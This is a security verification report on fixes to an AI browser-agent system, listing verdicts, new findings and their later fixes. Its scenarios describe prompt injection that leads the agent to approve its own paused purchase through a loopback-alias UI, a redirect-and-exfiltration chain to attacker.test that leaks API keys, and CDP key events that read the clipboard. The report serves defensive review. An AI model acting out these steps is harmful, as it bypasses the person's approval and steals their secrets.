# Browser engine v2: verification of the security fixes

- Date: 2026-09-29. Read-only. No source file changed. No daemon, Chrome or runtime was started, and nothing touched 18788/18789 or `~/.senclaw`.
- Scope:
  - Daemon `senclaw-browser` `7db3d79..HEAD`: 2733669, 8576572, aafd840, 312760d, c079151.
  - sen-browser `67822c6..HEAD`: 372779a, fd28872, 9556287, 7539992.
  - Extension `e3dd99d..HEAD`: e9d9ecc, 4434ed1.
  - Web 447c90b. Desktop f347d66 and eba72ea.
- Checks I ran:
  - Extension `npx vitest run`: 33/33 pass.
  - A scratch probe of the real `checkCommand` (quoted under N4).
  - Node (WHATWG) parsing of loopback aliases, plus live DNS: `lvh.me` and `127.0.0.1.nip.io` both resolve to 127.0.0.1.
  - SHA-256 of the runtime's 5 page scripts against the extension's `script-bundle.json`: all match.
  - Every runtime CDP call against the new per-method parameter lists: all fit, so the allowlists break no feature.
- Not run: `cargo build` and `cargo test` (disk is nearly full), and anything that needs a live Chrome.
- Labels:
  - CONFIRMED: shown by reading the code, and by the probe where one is cited.
  - PLAUSIBLE: the code path is confirmed; the browser or site behaviour was not exercised.

## Verdicts

| # | Verdict | Evidence |
|---|---|---|
| C1 | CLOSED | `Page.reload` is gone from both lists. Parameter lists are per method and refuse unknown keys: sen-browser `src/allowlist.rs:16-37,43-52`, extension `src/lib/allowlist.ts:22-41,98-105`. Both lists have the same 15 methods with the same keys. Probe: `Page.reload{scriptToEvaluateOnLoad}` → `blocked_method`. |
| M5 | PARTLY | The 11 unused methods are removed. `commands` must equal `["selectAll"]` (`allowlist.rs:74-78`, `allowlist.ts:123`). The history entry is checked (`relay.ts:215-224`, `tab.rs:596-598`). The clipboard is still reachable through key and mouse events: see N4. |
| H1 | CLOSED | `do_step` passes the dialog type of the observation it acts on (`rest.rs:349-350`). A missing type is Approve (`policy.rs:109-113`). The loop parks every dialog that is not an alert (`run.rs:778-799`). Nit: N12. |
| H2 | PARTLY | Enter is judged by `multiline`, `search` and `submit` (`policy.rs:91-106`, `snapshot.js:159-170`). A form whose default button has no accessible name reports `submit: ""`, which is only Logged: see N5. |
| H3 | PARTLY | Phrases now match token-wise and the list is longer (`policy.rs:30-67`). The raise-only model check exists (`run.rs:310-363`, `rest.rs:351-355`). Gaps: see "H3: what remains" below. |
| H4 | CLOSED for chats | Runtime ids carry an epoch (`browser.rs:63,69-71`). `current_tab` checks the owner (`rest.rs:273-296`), and look, do, read, screenshot and handover all call it. `SHOWN` and `CHAT_TABS` entries are forgotten on a mismatch. Residuals: all virtual workers share the owner `"virtual-worker"`, and all workflow steps share `"workflow"`, across chats (`lib.rs:2345-2351`, `workflow.rs:244-250`; this predates the fixes). Shared tabs are open to every chat: N3. |
| M1 | CLOSED (checker) | The per-call check runs before `skip_mcp` (`permissions.rs:498-506`). MCP tools are never read-only, so the check always runs (`engine.rs:2651-2653`). Only the MCP tool and the REST route call `run::approve`. A watch probe cannot reach the browser server: only the dispatch and usage specs are registered (`lib.rs:1792,1803`, `service.rs:970-977`). The agent's own browser can still reach the REST route through the SenClaw UI: see N1. |
| M2 | CLOSED for detected fields | `snapshot.js:122-123` blanks the value and sets `filled`. `marker`, `page_key` and `guards`, which still hold raw values, stay inside the runtime (`observation.rs:35-69`). `tests/managed.rs` asserts the one-time code never leaves. Hosted redaction: `run.rs:280-307`. Leftovers: N11. |
| M3 | CLOSED | Each part of the fix is in place: <ul><li>pipe generations: `extension.rs:79-82,325-333`</li><li>`ensure_pipe` serialised: `:352`</li><li>traffic both ways counts as use: `:307,316-322`</li><li>lease: `run.rs:179-192`, `extension.rs:336-347,434-437`</li><li>approve and resume reopen the pipe: `rest.rs:229-233,252-255`</li><li>`pipe_closed`: `extension.rs:102-106` → `connection.ts:178-179` → `background.ts:93-97`</li></ul>No lock-order inversion: the hub's std lock is never held together with `TASKS`/`APPROVALS`, and the sweeper reads `extension_busy()` before taking it. `TASKS`→`APPROVALS` is the only nesting (`run.rs:527-536`). Leftovers: N6, N7. |
| M4 | CLOSED | `run.rs:753-760,810-812,606-611`. |
| M6 | PARTLY (as the resolution states) | The 14-minute clock is checked only between passes. One pass can run past the one-minute margin: LLM fallback, text, up to 5 verify calls, then the answer. |
| M7 | PARTLY | Replay, withdrawal and `shared_tab` work. Shares are lost when the extension reconnects or the daemon restarts (N10). They are also open to every chat (N3). |
| M8 | CLOSED | Caps at `run.rs:137,151-155,527-536`, `rest.rs:39-50` and `extension.rs:38,113-116`. The eviction order is a problem: N9. |
| L1 | CLOSED | `rest.rs:456-476` filters by chat, and the MCP server always sends an owner (`browser_agent_server.rs:149,238-240`). Pairing codes remain only on the UI's `/status` and `/extension`. Shares are visible to every chat: N3. |
| L2 | CLOSED for budget | `run.rs:453`. `needs_input` is still open, as stated. |
| L3 | CLOSED | `proxy.rs:171-177,195`. The route is GET-only (`core.rs:665`). `upgrade` and `connection` are stripped (`proxy.rs:31-45`), so `GET /api/browser/v1/drivers/extension` cannot replace the live relay. |
| L4 | CLOSED | `extension.rs:243-266` runs under one lock and checks `is_closed`. A socket that closes after approval is removed by `unregister` (`:294-300`). |
| L5 | CLOSED | `run.rs:270-276`. |
| L6 | PARTLY | Literal loopback hosts are refused (`policy.rs:148-160`, `rest.rs:58-64`). Loopback aliases get through (N1), and `open`/`do` return the final page without checking it (N2). |
| L7 | CLOSED | `policy.rs:162-168`. |
| L8 | CLOSED for a well-behaved runtime | `relay.ts:245-250` clears contexts on a main-frame navigation. That needs `Page.enable`, which the runtime sends (`tab.rs:233`). A runtime that skips it keeps stale ids, but only approved scripts can run there. |
| L9 | OPEN | Acknowledged. |
| L10 | CLOSED | `settings.rs:109`. |

## New findings, by severity

### N1. High (PLAUSIBLE): loopback aliases get past `is_own_api`, so the agent's browser can drive the whole SenClaw UI, including the new approvals card

**Where**
- `policy.rs:152-160` matches only:
  - the literal host `localhost`, and names ending in `.localhost`
  - IP addresses for which `is_loopback()` or `is_unspecified()` holds
- `auth.rs:250-256,399-403`: in `auto` mode with a loopback bind (the default), `authorize` accepts every request, and nothing checks the `Host` header.
- The web UI calls its API with a relative `fetch(path)` (web-app `runtimeApi.ts:235`), so it works under any hostname that reaches the socket.

**Aliases that pass** (the `url` crate follows WHATWG, and these checks were run with Node and live DNS):
- `http://localhost.:18788/`: the host stays `localhost.`.
- `http://[::ffff:127.0.0.1]:18788/`: the host is `::ffff:7f00:1`, and Rust's `Ipv6Addr::is_loopback` is true only for `::1`.
- `http://lvh.me:18788/` and `http://127.0.0.1.nip.io:18788/`: both resolve to 127.0.0.1.

**Scenario**
1. Text injected into a page tells the agent to `browser_open http://lvh.me:18788/`. `refuse_own_api` lets it through.
2. Later calls pass `current_tab` too, because the runtime's `last_url` is `lvh.me`.
3. The SPA loads without a token.
4. With `browser_look` and `browser_do`, the agent opens Settings → Browser → "Waiting for your approval", clicks "Approve", then the Popconfirm's "OK". Both clicks are Auto, because neither word is in `RISKY`.
5. The UI POSTs `/api/browser-agent/approvals/:id {approve:true}`, and the paused purchase runs.

The raise-only model check might catch "Approve". With `llm-only`, or with no decision runtime, it never does.

The same browser session can also:
- read the raw `apiKey` values at `/api/llm-config` (`llm_config.rs:94-117`, `group_manager/types.rs:224-225`);
- reach Plugins, where a Space App install runs code on this machine;
- approve an extension pairing.

**Fix**
1. When the daemon runs in `auto` mode on a loopback bind, allow only these `Host` headers: `127.0.0.1`, `localhost` and `[::1]`, with the port. Reject every other `Host` with 403 or 421. This also closes classic DNS rebinding against the daemon from any page in the person's own Chrome, an exposure that predates this work.
2. In `is_local_port`, strip one trailing dot and map IPv4-mapped addresses with `to_ipv4_mapped()` before the loopback test.
3. Keep the URL check as a second layer.

### N2. Medium (path CONFIRMED; redirect behaviour PLAUSIBLE): `browser_open` and `browser_do` return a page on SenClaw's own API without checking it

**Where**
- `rest.rs:382-393` checks only the URL the agent asked for. It then returns `table(&obs)` for wherever Chrome ended up after redirects.
- `rest.rs:367-372` returns `table(&next)` after an action (up to 3000 characters of text). It never checks `next.url`.
- The check in `current_tab` (`:294`) runs before the action, not after.

**Scenario**
1. `browser_open https://attacker.test/r` receives a 302 to `http://127.0.0.1:18788/api/llm-config`. The response's `page.text` holds the provider keys.
2. `browser_open https://attacker.test/?k=…` then sends them out. No step needs approval.

A `browser_do CLICK` on a link to the same URL leaks the same way. Later look, read and screenshot calls on that tab are refused, but by then the page has already been returned. This works for any daemon GET endpoint.

**Fix**
- Run `refuse_own_api` on `obs.url` in `open`, and on `next.url` in `do_step`, before `remember_shown` and before returning.
- The loop already checks every observation.

### N3. Medium (CONFIRMED; impact depends on how channels are set up): a tab the person shared is offered to every chat

**Where**
- Shares are kept per extension connection, not per chat (`extension.rs:195-197`).
- Every chat's `browser_tabs` returns `{tab, url, title}` for every share (`rest.rs:473`).
- `browser_task` now takes `shared_tab` (`browser_agent_server.rs:185-193`).
- The runtime hands the tab to the first chat that asks (`browser.rs:256-268`).

**Scenario**
1. The owner shares their bank tab, meaning to use it from their DM.
2. The agent of a paired Telegram group chat sees the tab's URL and title in `browser_tabs`.
3. At a member's request, that agent runs `browser_task {shared_tab: N, question: "balance?"}`. It reads the logged-in page and posts the answer into the group.
4. Any risky step asks for approval through that group's own permission flow.

This widens the original review's open question about group chats and the extension.

**Fix**
- Bind each share to one chat: the side panel names the chat, or the owner confirms the first adoption.
- Show `shared_tabs` only to that chat.
- Refuse `browser: "extension"` and `shared_tab` in group and channel chats unless the owner turns it on.

### N4. Medium (allowlists CONFIRMED by probe; Chrome behaviour PLAUSIBLE): the clipboard is still reachable through key and mouse events

**Where.** `allowlist.ts:33-36,123` and `allowlist.rs:27-30,74-78` restrict only `commands`. `modifiers`, `windowsVirtualKeyCode` and `button` accept any value.

**Probe.** Against the real `checkCommand`, each of these returns `{ok:true}`:
- `{type:"rawKeyDown", key:"v", code:"KeyV", windowsVirtualKeyCode:86, modifiers:2}` (Ctrl+V)
- `{type:"rawKeyDown", key:"Insert", code:"Insert", windowsVirtualKeyCode:45, modifiers:8}` (Shift+Insert)
- `Input.dispatchMouseEvent {type:"mousePressed", button:"middle"}`

**Chrome behaviour**
- Ctrl+V: on Windows and Linux, Blink's key table maps it to Paste. Puppeteer documents that keyboard shortcuts work through CDP everywhere except macOS.
- Shift+Insert: Blink maps it to Paste as well.
- A middle click on Linux pastes the primary selection.

**Scenario.** This assumes the design's "compromised daemon or runtime" threat model:
1. Open `https://attacker.test/`, a page with a text field, in the person's Chrome.
2. Click the field.
3. Send Ctrl+V.
4. Read the field back with the approved snapshot script, or let the page post it.

**Fix.** In both lists, allowlist exact key events:
- `Enter`, `Escape`, `Tab`, `Backspace`, `ArrowUp` and `ArrowDown`, with `modifiers` 0;
- `key:"a"` / `code:"KeyA"`, with `modifiers` 2 or 4 and `commands:["selectAll"]`.

Also restrict `button` to `left` or `none`.

### N5. Medium (CONFIRMED; per-site PLAUSIBLE): Enter in a form whose submit button has no accessible name is only Logged

**Where**
- `snapshot.js:167-168` reports `submit: ""` when the form's default button is icon-only.
- In `policy.rs:99-103`, `any_word("")` finds nothing, so the tier is Logged.
- If no decision model is configured, nothing raises it to Approve.

**Scenario.** A transfer or comment form ends in a paper-plane or arrow `<button>` with no aria-label. `TYPE_TEXT` followed by `KEY_ENTER` submits the form, and nobody is asked.

**Fix**
- Treat an empty `submit` label like a missing one, which is already Approve.
- Also report `input[type=image]` buttons and buttons attached to the form through the `form=` attribute.

### Low and Info
- **N6. Low (PLAUSIBLE): one stalled pipe connect blocks all extension work.**
  - `ensure_pipe` holds the process-wide `opening` lock across `ensure_slot_started` and `connect_async`, and the connect has no timeout (`extension.rs:352-375`).
  - A single stalled handshake therefore blocks every extension call.
  - That includes approval POSTs from Settings; the web client sets no timeout on them.
  - Fix: wrap the connect in `tokio::time::timeout`, about 10 s.
- **N7. Low (PLAUSIBLE): page events can keep the pipe open forever.**
  - Every forwarded `Page.*` event refreshes `last_used` (`extension.rs:307,316-322`).
  - Take a finished task's tab that is still attached, on a busy page (SPA route changes, ad frames). It can keep the pipe, the runtime and the person's yellow debugger bar up indefinitely.
  - Fix: count requests and responses as use, not events.
- **N8. Low (CONFIRMED): a disconnected extension blocks declining too.**
  - The approval route opens the extension pipe for a decline as well as an approval (`rest.rs:253-255`).
  - With the extension disconnected, an approval that is not a dialog can be neither approved nor declined, and its card never clears.
  - Fix: skip the pipe when `approve == false` and the pending action has no `reject_action`.
- **N9. Low (CONFIRMED): another chat can push a pending approval out.**
  - `park` evicts the oldest of the 100 parked tasks whatever its state (`run.rs:527-536`).
  - Any chat that parks 100 tasks can push another chat's pending approval out, and it disappears from Settings without notice.
  - Fix: evict tasks that are not waiting for approval first, and keep approvals for their lease.
- **N10. Low (CONFIRMED): shares are lost when the extension reconnects.**
  - After an extension reconnect or a daemon restart, `Conn.shared` starts empty (`extension.rs:96-97`).
  - The extension does not announce its shares again on `welcome` (`background.ts:80-88`).
  - The side panel still says "shared", but no agent can adopt those tabs.
  - Fix: resend `shared_tab` for every `t.shared` tab when the state becomes `connected`.
- **N11. Low (CONFIRMED): what M2 leaves behind.**
  - Sensitive-field detection ignores `<label>` text (`snapshot.js:17-18`), so `<label>Card number</label><input name="f17">` still sends its value.
  - A sensitive `<select>`, such as a card expiry, keeps its `current_value` (`:112-113`).
  - Hosted redaction leaves `url` and `title` unmasked.
- **N12. Info: the loop's dialog rule fails open on a missing type.**
  - The loop's dialog rule treats a missing `type` as `"alert"` and accepts it (`run.rs:779`). The policy fails closed on the same case.
  - This cannot happen today: CDP always sends a `type` (`tab.rs:204-208`).
- **N13. Info: resume and approval routes are not bound to the calling chat.**
  - `/tasks/:id/resume` and `/approvals/:id` do not check which chat is calling (`rest.rs:229-261`). The ids work as bearer capabilities.
  - `GET /approvals` lists them, and N1/N2 make that route reachable.
- **Info: the M1 change also refuses `browser_approve` when a chat has its own skip toggle on.**
  - This is documented in CLAUDE.md, and it is stricter than the original review's accepted residual.
  - It is a UX trade-off: the person has to approve in Settings → Browser.

### H3: what remains
- Words that are still Auto:
  - "Allow" and "Authorize": OAuth consent in the person's signed-in Chrome.
  - "Accept", "Agree", "Approve", "Yes", "OK", "Continue".
  - "Save", "Archive", "Comment", "Order", "Complete", "Finish".
- An icon button's label falls back to its role, "button", so it matches nothing.
- Only English and Vietnamese are covered.
- Vietnamese text in decomposed form (NFD) splits into separate tokens, because combining marks are not alphanumeric (PLAUSIBLE).
- The model check covers only CLICK and KEY_ENTER, and only when a decision model answers:
  - It does nothing with `llm-only`, when sen-sysone is not installed, or on any error.
  - The implementer's own measurement shows weak recall: a bank's "Confirm" scored 0.08.

## Checked and holding
- **Locks and cancellation**
  - The hub's std lock is never held across an await, or together with `TASKS`/`APPROVALS`, so there is no deadlock or poisoning path.
  - `ensure_pipe` has no await between spawning its tasks and installing the pipe, so a cancelled call leaks nothing.
  - `begin_request` and `end_request` are balanced.
- **Pipe generations**
  - A reader that ends late never closes a newer pipe.
  - `pipe_closed` is queued on the same channel before any frame of the new pipe.
  - The extension's `release()` marks tabs detached synchronously, so an `attach` that follows re-attaches in order.
- **Scripts and values**
  - The page-script hashes match between runtime and extension.
  - Every CDP call the runtime makes fits the new parameter lists.
  - Raw values stay inside the runtime.
- **Pairing I/O.** `approve_code` does its file I/O under the hub lock without taking it again: `paired()` and `save_paired()` take no lock.
- **UIs**
  - Web and desktop call the correct routes and encode the ids.
  - `Driver` serialises in lowercase, as the UIs expect.
  - Both handle the 404 `no_approval`.
- **Robustness**
  - No new `unwrap` on page data.
  - `has_phrase` indexing stays in bounds.
  - The u32 budget subtraction cannot underflow.

## Recommended actions (in priority order)
1. N1: Host allowlist and alias canonicalisation.
2. N2: check the final URL in `open` and in `do`.
3. N3: scope shares to one chat.
4. N4: exact key and button allowlist.
5. N5: an empty submit label means Approve.
6. The Low items.

## Unresolved questions
- N1 and N2 need one live check, with a scratch HOME and scratch ports:
  - Does Chrome load `http://localhost.:<ui>/` and `http://lvh.me:<ui>/`?
  - Does Chrome follow a 302 from a public page to loopback?

  I expect yes to all three.
- N4: does a CDP Ctrl+V (Linux/Windows) or Shift+Insert (macOS) paste into a focused field?
- Should any group or channel chat get `browser: "extension"` or `shared_tab` at all?

---

## Resolution (2026-09-29, second pass)

Fixed by the implementer; the findings above are kept as written. Tests are acceptance checks S10–S12 and U1
(`acceptance.py`), plus the ones named below.

| # | Fix | Where (commit) | Test |
|---|-----|----------------|------|
| N1 | The daemon trusts this machine only for requests that name it as local clients do (`Host` loopback or absent) and that no other site's page sent (`Origin` absent or loopback; `chrome-extension://` only on `/browser*`). Closes `lvh.me`, `localhost.`, `[::ffff:127.0.0.1]`, DNS rebinding — and cross-site **WebSockets**: with no gateway token set, every WS client used to be authenticated, so any page in any browser here could open `ws://127.0.0.1:18789` and answer permission prompts. `is_own_api` also canonicalises trailing dots and IPv4-mapped addresses. | senclaw 8503d3f, 6444d3b | S10; policy tests |
| N2 | `open` and `do` check where the page landed; a page on SenClaw's own API is not returned (403) and its shown observation is dropped | senclaw 6444d3b | S12 |
| N3 | **Open** — product decision (see Unresolved questions): who may use the person's Chrome and shared tabs from group and channel chats | — | — |
| N4 | Both allowlists accept exactly the runtime's own key and mouse events: listed keys without modifiers, "a" only as Cmd/Ctrl select-all, left button only, no mouse modifiers | sen-browser f983a21, extension a2686b5 | S11; extension allowlist tests |
| N5 | Enter in a form whose submit button has no words needs the person | senclaw 6444d3b | S2 (policy test) |
| N6 | The pipe connect is bounded (15 s) | senclaw 6444d3b | — |
| N7 | Page events alone do not keep the pipe alive | senclaw 6444d3b | — |
| N8 | A decline goes through when the extension is gone | senclaw 6444d3b | — |
| N9 | Eviction takes tasks not waiting for the person first | senclaw 6444d3b | — |
| N10 | The extension offers its standing shares again when it (re)connects; a share a session used up is reported and dropped everywhere | extension 732c90c | extension relay test |
| N11 | **Open** — label-text detection, sensitive `<select>`, hosted `url`/`title` | — | — |
| N12 | A dialog without a type is not accepted as an alert | senclaw 6444d3b | — |
| N13 | An agent's approve/resume must come from the task's own chat; the settings screens (no chat) answer for the person | senclaw 6444d3b | S12 |

Still open: N3 and N11 (above), H3's remaining words (`Allow`, `Authorize`, …), L9, the full M6 task registry.
